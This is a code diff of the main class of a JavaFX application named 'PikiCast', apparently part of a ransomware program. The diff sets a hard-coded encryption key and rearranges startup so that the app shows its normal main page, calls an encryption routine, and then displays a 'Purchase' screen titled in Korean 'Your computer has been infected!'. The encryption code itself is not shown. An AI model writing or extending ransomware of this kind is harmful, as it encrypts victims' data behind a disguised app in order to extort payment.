@@ -18,7 +18,7 @@ public class Main extends Application {
     public Main()
     {
         hostServices = HostServicesFactory.getInstance(this);
-        this.encryptionController= new EncryptionController("Mary has onecat1");
+        this.encryptionController= new EncryptionController("WelcomeToDimigo!");
     }
 
     public static void main(String[] args)
@@ -29,12 +29,6 @@ public class Main extends Application {
     @Override
     public void start(Stage stage) throws Exception {
 
-        this.scene = new Scene(FXMLLoader.load(getClass().getResource("MainPage.fxml")));
-
-        stage.setScene(this.scene);
-        this.stage = stage;
-        this.stage.setTitle("PikiCast");
-        this.stage.show();
 
         if(encryptionController.isEncrypted())
         {
@@ -45,11 +39,18 @@ public class Main extends Application {
         }
         else
         {
+
+            this.scene = new Scene(FXMLLoader.load(getClass().getResource("MainPage.fxml")));
+            stage.setScene(this.scene);
+
             encryptionController.encryption();
+
             this.scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
             stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
             stage.setScene(this.scene);
         }
+        this.stage = stage;
+        this.stage.show();
     }
     public static void changeToUndecryptedScene()
     {
